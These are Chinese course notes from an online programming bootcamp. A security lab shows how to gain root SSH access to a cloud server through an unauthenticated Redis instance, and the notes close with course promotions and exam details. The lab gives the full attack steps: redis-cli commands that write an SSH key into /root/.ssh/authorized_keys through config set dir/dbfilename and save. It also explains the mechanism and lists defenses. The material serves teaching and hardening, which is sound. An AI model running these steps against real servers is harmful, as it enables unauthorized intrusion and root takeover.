* 核心：就是把公钥保存到  $HOME/.ssh/authorized_keys 目录



![image-20210321165345846](img/image-20210321165345846.png)



郑重声明⚠️：本集内容只限于小滴课堂用于教学提高业务系统安全性，切勿使用课程思路进行攻击破坏或者获取利益，如产生的一切后果与本人和所属公司无关。

```
《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。

【提供侵入、非法控制计算机信息系统程序、工具罪】提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚

天网恢恢，疏而不漏，一切操作都是可以被追寻到的，ip/设备/网络/基站/监控等等，总有你想不到的方式抓到你
```

 













#### 第2集 环境机器准备-按量付费形式-阿里云ECS服务器准备两台 

**简介：环境机器准备-按量付费形式-阿里云ECS服务器准备两台 **

*  阿里云机器准备 2台（多台用按量付费） 
   *  阿里云购买地址：https://www.aliyun.com/minisite/goods?taskCode=pintuan20201212&recordId=292600&userCode=r5saexap
   *  操作系统 CentOS7.X
   *  默认带宽1M
   *  最少1核2g，推荐2核4g
   *  **注意：用新用户购买才有折扣，新手机号和新身份证，新用户权益只有1次，买久一点，比如3年**

![image-20210310143531458](img/image-20210310143531458.png)



* 机器一：黑客使用的
* 机器二：你使用的，被入侵的机器，需要安装Redis















#### 第3集 阿里云ECS服务器安装Redis6-入侵环境准备

**简介：阿里云ECS服务器安装Redis6-入侵环境准备 **

* 两台服务器安装Redis6
* 开启远程连接
* 不设置密码

![image-20210321182058433](img/image-20210321182058433.png)

* 守护进程运行
  * daemonize yes
* 指定配置文件启动
  * ./redis-server ../redis.conf
* 开放网络安全组
  * 大家是不是经常这样做，测试学习使用

```
yum install gcc-c++
yum install cpp
yum install binutils
yum install glibc
yum install glibc-kernheaders
yum install glibc-common
yum install glibc-devel
yum install gcc
yum install make

make distclean
make clean

make
```





![image-20210321170133923](img/image-20210321170133923.png)









#### 第4集 【前方高能】入侵阿里云ECS服务器提权实战

**简介：入侵阿里云ECS服务器提权实战 **

* 避免违规，大家使用自购阿里云ECS
*  郑重声明⚠️：本集内容只限于小滴课堂用于教学提高业务系统安全性，切勿使用课程思路进行攻击破坏或者获取利益，如产生的一切后果与本人和所属公司无关。

```
《刑法》第二百八十五条　【非法侵入计算机信息系统罪；非法获取计算机信息系统数据、非法控制计算机信息系统罪】违反国家规定，侵入国家事务、国防建设、尖端科学技术领域的计算机信息系统的，处三年以下有期徒刑或者拘役。

违反国家规定，侵入前款规定以外的计算机信息系统或者采用其他技术手段，获取该计算机信息系统中存储、处理或者传输的数据，或者对该计算机信息系统实施非法控制，情节严重的，处三年以下有期徒刑或者拘役，并处或者单处罚金；情节特别严重的，处三年以上七年以下有期徒刑，并处罚金。

【提供侵入、非法控制计算机信息系统程序、工具罪】提供专门用于侵入、非法控制计算机信息系统的程序、工具，或者明知他人实施侵入、非法控制计算机信息系统的违法犯罪行为而为其提供程序、工具，情节严重的，依照前款的规定处罚

天网恢恢，疏而不漏，一切操作都是可以被追寻到的，ip/设备/网络/基站/监控等等，总有你想不到的方式抓到你
```

* 步骤

```
1、本地ssh-keygen生成一对秘钥
ssh-keygen

2、公钥生成攻击键值, 生成后查看下 cat test.txt
(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n";) > test.txt

3、配置Key到Redis中
cat test.txt |redis-cli -h 192.168.243.129 -x set bar

4、登录Redis进行检查，是否已经写入进Redis中
redis-cli -h 192.168.243.129 get bar

5、通过Redis保存机制替换系统文件
config set dir /root/.ssh
config get dir
config set dbfilename "authorized_keys"
save
exit

6、成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 

7、登录远程主机看下效果 ssh -i id_rsa root@192.168.243.129
```











#### 第5集 入侵阿里云ECS服务器提权-redis操作原理讲解

**简介：入侵阿里云ECS服务器提权流程原理讲解 **

* 回顾入侵流程，利用redis的持久化操作文件权限
  * Redis Config Set 命令可以动态地调整 Redis 服务器的配置(configuration)而无须重启。
  * Redis Save 命令执行一个同步保存操作，将当前 Redis 实例的所有数据快照(snapshot)以 RDB 文件的形式保存到硬盘。
  * Redis支持RDB和AOF两种持久化机制
    * RDB持久化是把当前进程数据生成快照保存到硬盘的过程，触发RDB持久化过程分为手动触发和自动触发
    * redis持久化配置，RDB文件保存在dir配置指定的目录下，文件名通过dbfilename配置指定
    * 通过执行config set dir {newDir} 和 config set dbfilename {newFileName}运行期动态执行
    * 当下次运行时RDB文件会保存到新目录



![image-20210321171345694](img/image-20210321171345694.png)



















#### 第6集 如何避免云服务器被入侵提权

**简介：如何避免云服务器被入侵提权 **

* 如何避免自己的云服务器被入侵
  * 禁止一些高危命令
  * 以低权限运行应用服务
  * 为服务 添加复杂密码验证
  * 禁止外网访问，配置防火墙
  * 保证 authorized_keys 文件的安全(只读，防添加新公钥等)






















![logo](https://file.xdclass.net/note/2020/javaweb/%E5%9B%BE%E7%89%87/logo.png) **愿景："让编程不再难学，让技术与生活更加有趣"**

### 第五十八章  大课训练营总结和在线答题考核



#### 第1集 1024电商平台大课训练营总结

**简介：1024电商平台大课训练营总结 **

* 微服务大课训练营300集+的内容
* 业务代码写的应该挺爽的
* 分布式知识：分布式文件、分布式锁、分布式事务
* 超级通用的多个项目模型
* 分布式系统的多个解决方案
* 对标大厂的高级工程师简历+技术Leader的简历+能力提升
* 视野提升：海量请求自动化扩容、容器编排、安全攻防等

![image-20210324104025522](img/image-20210324104025522.png)





















#### 第2集 大课训练营之在线答题考核介绍和操作

**简介：大课训练营之在线答题考核介绍和操作 **

* 在线答题 30道 题目
  * 题库有1000+题目随机抽取
  * 单选题+不定项选择题组成 
  * 考核时间截止到2023年12月，不限次数
  * 合格分90分，满分100分
  * 合格后会颁发在线证书，拿到证书后联系客服（三选一）
    * 如果是有参加活动返现的就有返现300元
    * 【惊喜】如果是有参加抵扣课程或者 模拟面试服务直接 抵扣500元
    * 【惊喜】如果是有参加下个 ”海量数据处理训练营“ 的可以抵扣500元
* 公众号：小滴课堂
  * 底部菜单栏:  限时活动 -->  项目大课考核
  * 直接即可进入考试页面

![qrcode_for_gh_054171e2a111_344](img/qrcode_for_gh_054171e2a111_344.png)



![image-20210324113946401](img/image-20210324113946401.png)



















#### 第3集 海量数据处理大课介绍和远程模拟面试服务

**简介：海量数据处理大课介绍和远程模拟面试服务 **

* 海量数据处理大课训练营
  * 开课时间：21年 7~9月
  * 核心内容
    * MySQL架构性能优化+分布式调度
    * 多场景业务 垂直+水平分库、垂直+水平分表
    * 海量数据处理，冷热数据归档和数据路由实战
  * 价格这块还没定，但是一定物超所值！！！
    * 学到技术，涨薪是关键，付出肯定会有收获，未来一定是持续学习的人
    * 我也在学习每年参加各种技术沙龙和内部分享会投入超过10万+，但是我认为是值的，且带来的收益更大

![image-20210324113211367](img/image-20210324113211367.png)





* 远程模拟面试服务

  * 一个钟左右的技术面试+复盘
    * 难度：阿里P5标准，工作0~2年
    * 难度：阿里P6或者P6+标准，工作2~5年
    * 难度：技术Leader标准，工作4~8年

  

* 【重要】：这个需要和客服提前预约，我才好安排时间

  * 一般周末时间比较多，平时公司加班比较多

  * 两年内都有效

  * 面试前

    * 看面试专题视频 或者 项目大课训练营

    * 改造好自己的简历，提前发我

      

  

  ![image-20210324111345772](img/image-20210324111345772.png)



* 参加大课训练营的同学和参加过远程模拟面试的同学
  * 当然不能保证一定能找到高薪，但是多数同学都可以的！！！





![image-20210324111728305](img/image-20210324111728305.png)





![image-20210324112020860](img/image-20210324112020860.png)



















#### 第4集  家里管得严 挣点私房钱+IT技术人的职场充电站

**简介：挣点外快+IT技术人的职场充电站 **

* 小滴课堂开启了分销返佣金啦

  * 地址 https://appCZhhROVU1940.h5.xiaoeknow.com/distribute_recruit

  * 步骤：成为推广员，选择视频生成海报分享朋友圈，下单即可得到现金红包（大课现金红包100元）

    * 视频质量不错、主流技术栈

    * 干货多、让身边更多同学加进来学习，自己可以赚点饭钱

    * 朋友圈发效果更好

      

![image-20210325125626685](img/大课题库.png)



- 小滴课堂永久会员 & 小滴课堂年度会员

  - 适合IT后端人员，零基础就业、在职充电、架构师学习路线-专题技术方向
    - 包括业界主流技术栈，前端、后端、测试、架构等等课程，接近上百套视频，深度+广度
    - 包括 从零基础到就业班，高级工程师、技术负责人、架构师技术栈 全套学习路线
    - 永久会员可以观看全部专题IT技术，作为一个终生学习平台，每个月更新多套视频
    - 如何获取最新路线图，有你想学的多数主流技术栈，持续更新！！！

   

- 大课综合训练营

  - 适合用于专项拔高，适合有一定工作经验的同学，架构师方向发展的训练营，包括多个方向

    - 综合项目大课训练营【现在】
    - 海量数据分库分表大课训练营【接下去】
    - 架构解决方案大课训练营【接下去】
    - 全链路性能优化大课训练营【接下去】
    - 安全攻防大课训练营【接下去】
    - 数据分析大课训练营【接下去】
    - 算法刷题大课训练营【接下去】

     

- 直播小班课（留意官网即可或者联系我即可）

 

- 技术人的导航站（涵盖我们主流的技术网站、社区、工具等等，即将上线）
  - 地址：open1024.com
  - 官网:  xdclass.net



![支付成功弹窗-二当家](https://file.xdclass.net/note/2021/%E5%90%8E%E7%AB%AF%E6%8F%90%E6%95%88%E7%A5%9E%E5%99%A8/img/%E6%94%AF%E4%BB%98%E6%88%90%E5%8A%9F%E5%BC%B9%E7%AA%97-%E4%BA%8C%E5%BD%93%E5%AE%B61.png)



**小滴课堂，愿景：让编程不在难学，让技术与生活更加有趣**

**相信我们，这个是可以让你学习更加轻松的平台，里面的课程绝对会让你技术不断提升**



